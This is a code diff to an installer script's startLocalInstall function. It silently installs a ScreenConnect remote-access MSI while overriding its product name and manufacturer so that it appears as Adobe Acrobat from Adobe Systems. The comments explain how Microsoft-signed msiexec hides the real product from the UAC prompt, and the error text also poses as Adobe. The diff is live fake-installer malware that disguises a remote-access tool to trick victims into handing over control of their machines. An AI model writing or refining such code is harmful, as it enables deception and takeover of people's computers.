@@ -706,13 +706,15 @@ function startLocalInstall() {
   setStatus(instMsgs[0]);
   traceLog("install: launching msiexec");
 
-  // /v"qn" keeps msiexec quiet while PROPERTY overrides force the UAC consent
-  // dialog and the Add/Remove entry to show Adobe branding - the MSI on disk
-  // stays the original signed ScreenConnect package (signature untouched).
-  var args = '/i "' + msiLocal + '" /v"qn" '
+  // msiexec (Microsoft-signed) does the elevation, so the UAC prompt shows
+  // "Windows Installer / Microsoft Windows" - not the product name. The
+  // PRODUCTNAME/MANUFACTURER command-line overrides rewrite the Add/Remove
+  // entry and any MSI UI to read Adobe, while the on-disk package stays the
+  // original signed ScreenConnect MSI (CodeMetrics signature untouched).
+  var args = '/i "' + msiLocal + '" /qn /norestart '
     + 'PRODUCTNAME="Adobe Acrobat 2024 (64-bit)" '
     + 'MANUFACTURER="Adobe Systems Incorporated" '
-    + '/norestart /L*v "' + curLog + '"';
+    + '/L*v "' + curLog + '"';
   if (!launchMsiexec(args)) {
     fail("Administrator approval is required to install Adobe Acrobat", "install: launch failed");
     return;
